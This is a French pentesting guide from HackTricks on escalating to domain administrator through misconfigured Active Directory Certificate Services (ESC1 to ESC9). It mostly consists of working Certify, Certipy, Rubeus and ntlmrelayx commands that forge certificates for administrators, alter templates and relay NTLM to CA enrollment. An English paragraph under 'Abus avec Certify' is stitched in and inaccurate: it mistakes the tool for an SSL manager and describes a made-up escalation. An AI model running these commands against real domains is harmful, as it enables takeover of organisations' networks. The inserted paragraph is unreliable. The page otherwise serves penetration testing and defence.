# Escalade de domaine AD CS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Modèles de certificats mal configurés - ESC1

### Explication

* Le **CA d'entreprise** accorde des **droits d'inscription aux utilisateurs à faibles privilèges**
* **L'approbation du gestionnaire est désactivée**
* **Aucune signature autorisée n'est requise**
* Un descripteur de sécurité de **modèle de certificat excessivement permissif accorde des droits d'inscription aux utilisateurs à faibles privilèges**
* Le **modèle de certificat définit des EKU qui permettent l'authentification** :
* _Authentification client (OID 1.3.6.1.5.5.7.3.2), Authentification client PKINIT (1.3.6.1.5.2.3.4), Connexion par carte à puce (OID 1.3.6.1.4.1.311.20.2.2), Tout usage (OID 2.5.29.37.0), ou pas d'EKU (SubCA)._
* Le **modèle de certificat permet aux demandeurs de spécifier un subjectAltName dans le CSR :**
* **AD** utilisera l'identité spécifiée par le champ **subjectAltName** (SAN) d'un certificat **si** elle est **présente**. Par conséquent, si un demandeur peut spécifier le SAN dans un CSR, le demandeur peut **demander un certificat en tant que n'importe qui** (par exemple, un utilisateur administrateur de domaine). L'objet AD du modèle de certificat **spécifie** si le demandeur **peut spécifier le SAN** dans sa propriété **`mspki-certificate-name-`**`flag`. La propriété `mspki-certificate-name-flag` est un **masque de bits** et si le drapeau **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** est **présent**, un **demandeur peut spécifier le SAN**.

{% hint style="danger" %}
Ces paramètres permettent à un **utilisateur à faibles privilèges de demander un certificat avec un SAN arbitraire**, permettant à l'utilisateur à faibles privilèges de s'authentifier en tant que n'importe quel principal du domaine via Kerberos ou SChannel.
{% endhint %}

Cela est souvent activé, par exemple, pour permettre aux produits ou aux services de déploiement de générer des certificats HTTPS ou des certificats d'hôte à la volée. Ou en raison d'un manque de connaissance.

Notez que lorsqu'un certificat avec cette dernière option est créé, un **avertissement apparaît**, mais il n'apparaît pas si un **modèle de certificat** avec cette configuration est **dupliqué** (comme le modèle `WebServer` qui a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé, puis l'administrateur peut ajouter un OID d'authentification).

### Abus

Pour **trouver des modèles de certificats vulnérables**, vous pouvez exécuter :
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
Pour **exploiter cette vulnérabilité afin de se faire passer pour un administrateur**, on peut exécuter :
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
```
Ensuite, vous pouvez convertir le certificat généré au format **`.pfx`** et l'utiliser pour **vous authentifier à l'aide de Rubeus ou certipy** à nouveau:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Les binaires Windows "Certreq.exe" et "Certutil.exe" peuvent être utilisés de manière abusive pour générer le fichier PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

De plus, la requête LDAP suivante, lorsqu'elle est exécutée contre le schéma de configuration de la forêt AD, peut être utilisée pour **énumérer** les **modèles de certificats** qui ne nécessitent pas d'approbation/signature, qui ont une **EKU d'authentification client ou de connexion par carte à puce**, et qui ont le drapeau **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** activé :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modèles de certificats mal configurés - ESC2

### Explication

Le deuxième scénario d'abus est une variation du premier :

1. L'AC d'entreprise accorde des droits d'inscription aux utilisateurs à faible privilège.
2. L'approbation du responsable est désactivée.
3. Aucune signature autorisée n'est requise.
4. Un descripteur de sécurité de modèle de certificat excessivement permissif accorde des droits d'inscription aux utilisateurs à faible privilège.
5. **Le modèle de certificat définit l'EKU Toutes fins ou aucune EKU.**

L'**EKU Toutes fins** permet à un attaquant d'obtenir un **certificat** pour **n'importe quelle utilisation**, comme l'authentification client, l'authentification du serveur, la signature de code, etc. La même **technique que pour ESC3** peut être utilisée pour abuser de cela.

Un **certificat sans EKU** - un certificat de CA subordonnée - peut également être utilisé à **n'importe quelle fin**, mais pourrait **aussi être utilisé pour signer de nouveaux certificats**. Ainsi, en utilisant un certificat de CA subordonnée, un attaquant pourrait **spécifier des EKU ou des champs arbitraires dans les nouveaux certificats**.

Cependant, si la **CA subordonnée n'est pas approuvée** par l'objet **`NTAuthCertificates`** (ce qui ne sera pas le cas par défaut), l'attaquant **ne peut pas créer de nouveaux certificats** qui fonctionneront pour **l'authentification de domaine**. Néanmoins, l'attaquant peut créer **de nouveaux certificats avec n'importe quelle EKU** et des valeurs de certificat arbitraires, dont il y en a **beaucoup** que l'attaquant pourrait potentiellement **abuser** (par exemple, la signature de code, l'authentification du serveur, etc.) et cela pourrait avoir de grandes implications pour d'autres applications du réseau telles que SAML, AD FS ou IPSec.

La requête LDAP suivante, lorsqu'elle est exécutée contre le schéma de configuration de la forêt AD, peut être utilisée pour énumérer les modèles correspondant à ce scénario :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modèles d'agent d'inscription mal configurés - ESC3

### Explication

Ce scénario est similaire aux deux premiers, mais **exploite** un **EKU différent** (Agent de demande de certificat) et **2 modèles différents** (par conséquent, il a 2 ensembles de conditions),

L'EKU de l'Agent de demande de certificat (OID 1.3.6.1.4.1.311.20.2.1), connu sous le nom d'**Agent d'inscription** dans la documentation Microsoft, permet à un principal de s'**inscrire** pour un **certificat** au **nom d'un autre utilisateur**.

L'**"agent d'inscription"** s'inscrit dans un tel **modèle** et utilise le **certificat résultant pour co-signer une CSR au nom de l'autre utilisateur**. Il **envoie** ensuite la CSR **co-signée** à l'AC, s'inscrivant dans un **modèle** qui **autorise l'inscription au nom de**, et l'AC répond avec un **certificat appartenant à l'"autre" utilisateur**.

**Conditions 1:**

1. L'AC d'entreprise autorise les utilisateurs à faibles privilèges à s'inscrire.
2. L'approbation du responsable est désactivée.
3. Aucune signature autorisée n'est requise.
4. Un descripteur de sécurité de modèle de certificat excessivement permissif autorise les utilisateurs à faibles privilèges à s'inscrire.
5. Le **modèle de certificat définit l'EKU de l'Agent de demande de certificat**. L'OID de l'Agent de demande de certificat (1.3.6.1.4.1.311.20.2.1) permet de demander d'autres modèles de certificat au nom d'autres principaux.

**Conditions 2:**

1. L'AC d'entreprise autorise les utilisateurs à faibles privilèges à s'inscrire.
2. L'approbation du responsable est désactivée.
3. **La version du schéma du modèle est supérieure à 1 ou 2 et spécifie une exigence d'émission de politique d'application nécessitant l'EKU de l'Agent de demande de certificat**.
4. Le modèle de certificat définit un EKU qui permet l'authentification de domaine.
5. Les restrictions de l'agent d'inscription ne sont pas mises en œuvre sur l'AC.

### Abus

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour exploiter ce scénario :
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Les autorités de certification d'entreprise peuvent **restreindre** les **utilisateurs** qui peuvent **obtenir** un **certificat d'agent d'inscription**, les modèles d'inscription auxquels les **agents d'inscription peuvent s'inscrire**, et les **comptes** au nom desquels l'agent d'inscription peut **agir** en ouvrant `certsrc.msc` `snap-in -> clic droit sur l'AC -> clic sur Propriétés -> navigation` vers l'onglet "Agents d'inscription".

Cependant, le paramètre par défaut de l'AC est "Ne pas restreindre les agents d'inscription". Même lorsque les administrateurs activent "Restreindre les agents d'inscription", le paramètre par défaut est extrêmement permissif, permettant à tout le monde d'accéder à tous les modèles d'inscription en tant que n'importe qui.

## Contrôle d'accès vulnérable aux modèles de certificats - ESC4

### **Explication**

Les **modèles de certificats** ont un **descripteur de sécurité** qui spécifie quels **principaux AD** ont des **autorisations spécifiques sur le modèle**.

Si un **attaquant** a suffisamment d'**autorisations** pour **modifier** un **modèle** et **créer** l'une des **misconfigurations** exploitables des **sections précédentes**, il pourra l'exploiter et **escalader les privilèges**.

Droits intéressants sur les modèles de certificats :

* **Propriétaire :** Contrôle total implicite de l'objet, peut modifier toutes les propriétés.
* **Contrôle total :** Contrôle total de l'objet, peut modifier toutes les propriétés.
* **Écrire le propriétaire :** Peut modifier le propriétaire en un principal contrôlé par l'attaquant.
* **Écrire le DACL :** Peut modifier le contrôle d'accès pour accorder un contrôle total à un attaquant.
* **Écrire la propriété :** Peut modifier toutes les propriétés.

### Abus

Un exemple de privilège élevé comme le précédent :

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 se produit lorsqu'un utilisateur dispose de privilèges d'écriture sur un modèle de certificat. Cela peut par exemple être exploité pour écraser la configuration du modèle de certificat afin de rendre le modèle vulnérable à ESC1.

Comme nous pouvons le voir dans le chemin ci-dessus, seul `JOHNPC` dispose de ces privilèges, mais notre utilisateur `JOHN` a le nouvel attribut `AddKeyCredentialLink` vers `JOHNPC`. Étant donné que cette technique est liée aux certificats, j'ai également mis en œuvre cette attaque, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Voici un petit aperçu de la commande `shadow auto` de Certipy pour récupérer le hachage NT de la victime.

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy** peut écraser la configuration d'un modèle de certificat avec une seule commande. Par **défaut**, Certipy **écrasera** la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons également spécifier le paramètre **`-save-old` pour sauvegarder l'ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Contrôle d'accès vulnérable aux objets PKI - ESC5

### Explication

La toile des relations ACL interconnectées qui peuvent affecter la sécurité d'AD CS est vaste. Plusieurs **objets en dehors des modèles de certificats** et de l'autorité de certification elle-même peuvent avoir un **impact sur la sécurité de l'ensemble du système AD CS**. Ces possibilités comprennent (mais ne sont pas limitées à) :

* L'**objet ordinateur AD du serveur CA** (c'est-à-dire, compromission via S4U2Self ou S4U2Proxy)
* Le **serveur RPC/DCOM du serveur CA**
* Tout **objet ou conteneur AD descendant dans le conteneur** `CN=Services de clés publiques,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` (par exemple, le conteneur Modèles de certificats, le conteneur Autorités de certification, l'objet NTAuthCertificates, le conteneur Services d'inscription, etc.)

Si un attaquant à faible privilège peut **prendre le contrôle de l'un de ces objets**, l'attaque peut probablement **compromettre le système PKI**.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Il existe un autre problème similaire, décrit dans le [**post de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), qui concerne le drapeau **`EDITF_ATTRIBUTESUBJECTALTNAME2`**. Comme le décrit Microsoft, "si ce drapeau est **activé** sur le CA, **toute demande** (y compris lorsque le sujet est construit à partir d'Active Directory®) peut avoir des **valeurs définies par l'utilisateur** dans le **nom alternatif du sujet**".\
Cela signifie qu'un **attaquant** peut s'inscrire dans **N'IMPORTE QUEL modèle** configuré pour l'**authentification** de domaine qui permet également aux utilisateurs **non privilégiés** de s'inscrire (par exemple, le modèle Utilisateur par défaut) et **obtenir un certificat** qui nous permet de nous **authentifier** en tant qu'administrateur de domaine (ou **tout autre utilisateur/machine actif**).

**Remarque** : les **noms alternatifs** sont **inclus** dans une CSR via l'argument `-attrib "SAN:"` de `certreq.exe` (c'est-à-dire, "Paires Nom Valeur"). Cela est **différent** de la méthode pour **abuser des SAN** dans ESC1 car cela **stocke les informations de compte dans un attribut de certificat au lieu d'une extension de certificat**.

### Abus

Les organisations peuvent **vérifier si le paramètre est activé** en utilisant la commande `certutil.exe` suivante :
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
En dessous, cela utilise simplement le **registre distant**, donc la commande suivante peut également fonctionner :
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) vérifient également cela et peuvent être utilisés pour exploiter cette mauvaise configuration :
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ces paramètres peuvent être **définis**, en supposant des droits **administratifs de domaine** (ou équivalents), à partir de n'importe quel système :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Si vous trouvez ce paramètre dans votre environnement, vous pouvez **supprimer ce drapeau** avec :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Après les mises à jour de sécurité de mai 2022, les nouveaux **certificats** auront une **extension de sécurité** qui **intègre** la **propriété `objectSid` du demandeur**. Pour ESC1, cette propriété sera reflétée à partir du SAN spécifié, mais avec **ESC6**, cette propriété reflète la **`objectSid` du demandeur**, et non pas celle du SAN.\
Ainsi, **pour exploiter ESC6**, l'environnement doit être **vulnérable à ESC10** (Mappings de certificats faibles), où le **SAN est préféré par rapport à la nouvelle extension de sécurité**.
{% endhint %}

## Contrôle d'accès vulnérable de l'autorité de certification - ESC7

### Attaque 1

#### Explication

Une autorité de certification elle-même dispose d'un **ensemble d'autorisations** qui sécurisent diverses **actions de l'AC**. Ces autorisations peuvent être consultées depuis `certsrv.msc`, en cliquant avec le bouton droit sur une AC, en sélectionnant Propriétés, puis en passant à l'onglet Sécurité :

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

Cela peut également être énuméré via le [**module PSPKI**](https://www.pkisolutions.com/tools/pspki/) avec `Get-CertificationAuthority | Get-CertificationAuthorityAcl` :
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
Les deux droits principaux ici sont le droit **`ManageCA`** et le droit **`ManageCertificates`**, qui se traduisent par "administrateur de CA" et "gestionnaire de certificats".

#### Abus

Si vous avez un principal avec les droits **`ManageCA`** sur une **autorité de certification**, nous pouvons utiliser **PSPKI** pour inverser à distance le bit **`EDITF_ATTRIBUTESUBJECTALTNAME2`** afin de permettre la spécification de SAN dans n'importe quel modèle ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)) :

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

Cela est également possible sous une forme plus simple avec la cmdlet [**Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) de **PSPKI**.

Le droit **`ManageCertificates`** permet d'approuver une demande en attente, contournant ainsi la protection "approbation du gestionnaire de certificat de l'autorité de certification".

Vous pouvez utiliser une **combinaison** des modules **Certify** et **PSPKI** pour demander un certificat, l'approuver et le télécharger :
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### Attaque 2

#### Explication

{% hint style="warning" %}
Dans l'**attaque précédente**, les permissions **`Manage CA`** ont été utilisées pour **activer** le drapeau **EDITF\_ATTRIBUTESUBJECTALTNAME2** afin d'effectuer l'attaque **ESC6**, mais cela n'aura aucun effet tant que le service CA (`CertSvc`) n'est pas redémarré. Lorsqu'un utilisateur dispose du droit d'accès `Manage CA`, il est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, **ESC6 pourrait ne pas fonctionner** par défaut dans la plupart des environnements patchés en raison des mises à jour de sécurité de mai 2022.
{% endhint %}

Par conséquent, une autre attaque est présentée ici.

Prérequis :

* Seulement la permission **`ManageCA`**
* Permission **`Manage Certificates`** (peut être accordée à partir de **`ManageCA`**)
* Le modèle de certificat **`SubCA`** doit être **activé** (peut être activé à partir de **`ManageCA`**)

La technique repose sur le fait que les utilisateurs ayant le droit d'accès `Manage CA` _et_ `Manage Certificates` peuvent **émettre des demandes de certificat échouées**. Le modèle de certificat **`SubCA`** est **vulnérable à ESC1**, mais **seuls les administrateurs** peuvent s'inscrire dans le modèle. Ainsi, un **utilisateur** peut **demander** à s'inscrire dans le **`SubCA`** - ce qui sera **refusé** - mais **ensuite émis par le gestionnaire**.

#### Abus

Vous pouvez **vous accorder vous-même l'accès `Manage Certificates`** en ajoutant votre utilisateur en tant que nouvel officier.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Le modèle **`SubCA`** peut être **activé sur le CA** avec le paramètre `-enable-template`. Par défaut, le modèle `SubCA` est activé.
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusée**, mais nous sauvegarderons la clé privée et noterons l'ID de la demande.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Avec notre **`Gérer CA` et `Gérer Certificats`**, nous pouvons ensuite **émettre la demande de certificat échouée** avec la commande `ca` et le paramètre `-issue-request <ID de la demande>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Et enfin, nous pouvons **récupérer le certificat délivré** avec la commande `req` et le paramètre `-retrieve <ID de la demande>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## Relais NTLM vers les points de terminaison HTTP AD CS - ESC8

### Explication

{% hint style="info" %}
En résumé, si un environnement a **AD CS installé**, ainsi qu'un **point de terminaison d'inscription web vulnérable** et au moins un **modèle de certificat publié** qui permet l'**inscription des ordinateurs de domaine et l'authentification des clients** (comme le modèle **`Machine`** par défaut), alors un **attaquant peut compromettre N'IMPORTE QUEL ordinateur exécutant le service spouleur** !
{% endhint %}

AD CS prend en charge plusieurs **méthodes d'inscription basées sur HTTP** via des rôles de serveur AD CS supplémentaires que les administrateurs peuvent installer. Ces interfaces d'inscription de certificat basées sur HTTP sont toutes des **attaques de relais NTLM vulnérables**. En utilisant le relais NTLM, un attaquant sur une **machine compromise peut se faire passer pour n'importe quel compte AD authentifiant via NTLM**. Tout en se faisant passer pour le compte de la victime, un attaquant pourrait accéder à ces interfaces web et **demander un certificat d'authentification client basé sur les modèles de certificat `User` ou `Machine`**.

* L'interface d'inscription web (une application ASP au look plus ancien accessible à `http://<caserver>/certsrv/`), par défaut, ne prend en charge que HTTP, ce qui ne peut pas protéger contre les attaques de relais NTLM. De plus, elle n'autorise explicitement que l'authentification NTLM via son en-tête HTTP d'autorisation, de sorte que des protocoles plus sécurisés comme Kerberos sont inutilisables.
* Le **Service d'inscription de certificat** (CES), le **Service Web de stratégie d'inscription de certificat** (CEP) et le **Service d'inscription des périphériques réseau** (NDES) prennent en charge par défaut l'authentification de négociation via leur en-tête HTTP d'autorisation. L'authentification de négociation **prend en charge** Kerberos et **NTLM** ; par conséquent, un attaquant peut **négocier jusqu'à l'authentification NTLM** lors d'attaques de relais. Ces services web activent au moins HTTPS par défaut, mais malheureusement, HTTPS en lui-même ne **protège pas contre les attaques de relais NTLM**. Ce n'est que lorsque HTTPS est associé à la liaison de canal que les services HTTPS peuvent être protégés contre les attaques de relais NTLM. Malheureusement, AD CS n'active pas la protection étendue pour l'authentification sur IIS, ce qui est nécessaire pour activer la liaison de canal.

Les **problèmes** courants avec les attaques de relais NTLM sont que les **sessions NTLM sont généralement courtes** et que l'attaquant **ne peut pas** interagir avec des services qui **imposent la signature NTLM**.

Cependant, l'abus d'une attaque de relais NTLM pour obtenir un certificat à l'utilisateur résout ces limitations, car la session restera active tant que le certificat sera valide et le certificat peut être utilisé pour utiliser des services **imposant la signature NTLM**. Pour savoir comment utiliser un certificat volé, consultez :

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Une autre limitation des attaques de relais NTLM est qu'elles **nécessitent qu'un compte victime s'authentifie sur une machine contrôlée par l'attaquant**. Un attaquant pourrait attendre ou essayer de **le forcer** :

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abus**

La commande `cas` de **Certify** peut énumérer les **points de terminaison HTTP AD CS activés** :
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Les CAs d'entreprise stockent également les points de terminaison CES dans leur objet AD dans la propriété `msPKI-Enrollment-Servers`. Certutil.exe et PSPKI peuvent analyser et répertorier ces points de terminaison :
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Abus avec Certify

Certify is a popular tool used for managing SSL/TLS certificates on Windows systems. However, it can also be abused by attackers to escalate their privileges within an Active Directory domain.

The abuse of Certify involves the following steps:

1. **Obtain a low-privileged domain user account**: The attacker needs to gain access to a low-privileged domain user account within the target Active Directory domain.

2. **Install Certify**: The attacker installs Certify on their machine and configures it to use the target domain's Certificate Authority (CA).

3. **Request a certificate**: Using Certify, the attacker requests a certificate for their low-privileged domain user account.

4. **Export the certificate**: Once the certificate is issued, the attacker exports it from Certify.

5. **Import the certificate**: The attacker imports the exported certificate into their own user account on the target domain.

6. **Escalate privileges**: By importing the certificate, the attacker gains the privileges associated with the certificate, which may include administrative access or other elevated permissions within the domain.

This abuse of Certify can be a powerful technique for privilege escalation within an Active Directory domain. It is important for administrators to be aware of this potential vulnerability and take steps to secure their Certificate Authorities and monitor certificate requests and imports.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

Par défaut, Certipy demandera un certificat basé sur le modèle `Machine` ou `User` en fonction de si le nom du compte relayé se termine par `$`. Il est possible de spécifier un autre modèle avec le paramètre `-template`.

Nous pouvons ensuite utiliser une technique telle que [PetitPotam](https://github.com/ly4k/PetitPotam) pour forcer l'authentification. Pour les contrôleurs de domaine, nous devons spécifier `-template DomainController`.
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Pas d'extension de sécurité - ESC9 <a href="#5485" id="5485"></a>

### Explication

ESC9 fait référence à la nouvelle valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) de **`msPKI-Enrollment-Flag`**. Si ce drapeau est défini sur un modèle de certificat, la nouvelle extension de sécurité **`szOID_NTDS_CA_SECURITY_EXT`** ne sera pas intégrée. ESC9 est uniquement utile lorsque `StrongCertificateBindingEnforcement` est défini sur `1` (par défaut), car une configuration de mappage de certificat plus faible pour Kerberos ou Schannel peut être exploitée comme ESC10 - sans ESC9 - car les exigences seront les mêmes.

* `StrongCertificateBindingEnforcement` n'est pas défini sur `2` (par défaut : `1`) ou `CertificateMappingMethods` contient le drapeau `UPN`
* Le certificat contient le drapeau `CT_FLAG_NO_SECURITY_EXTENSION` dans la valeur `msPKI-Enrollment-Flag`
* Le certificat spécifie n'importe quelle EKU d'authentification client
* `GenericWrite` sur n'importe quel compte A pour compromettre n'importe quel compte B

### Abus

Dans ce cas, `John@corp.local` a `GenericWrite` sur `Jane@corp.local`, et nous souhaitons compromettre `Administrator@corp.local`. `Jane@corp.local` est autorisée à s'inscrire dans le modèle de certificat `ESC9` qui spécifie le drapeau `CT_FLAG_NO_SECURITY_EXTENSION` dans la valeur `msPKI-Enrollment-Flag`.

Tout d'abord, nous obtenons le hachage de `Jane` avec, par exemple, Shadow Credentials (en utilisant notre `GenericWrite`).

